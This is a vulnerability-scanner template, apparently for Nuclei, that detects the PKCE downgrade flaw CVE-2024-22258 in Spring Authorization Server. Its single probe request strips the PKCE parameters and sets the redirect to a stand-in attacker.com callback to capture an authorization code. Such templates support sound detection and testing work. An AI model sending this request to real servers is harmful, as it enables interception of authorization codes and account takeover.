id: CVE-2024-22258

info:
  name: Spring Authorization Server PKCE Downgrade Vulnerability
  author: Abdur Rahman Jamil Chowdhury
  severity: high
  description: |
    Spring Authorization Server is vulnerable to a PKCE downgrade attack, allowing attackers to bypass PKCE enforcement
    and execute an authorization code interception attack.
  tags: spring,oauth2,pkce,authorization-server,security-bypass
  references:
    - https://spring.io/security/cve-2024-22258
    - https://nvd.nist.gov/vuln/detail/CVE-2024-22258

requests:
  - method: GET
    path:
      - "{{BaseURL}}/oauth2/authorize?response_type=code&client_id=test-client&redirect_uri=https://attacker.com/callback&scope=openid&state=random&code_challenge=&code_challenge_method="
    matchers:
      - type: regex
        regex:
          - "(?i)Location:\\s*.*code=[a-zA-Z0-9_-]+"
        part: header
      - type: status
        status:
          - 302
          - 200
    follow_redirects: false
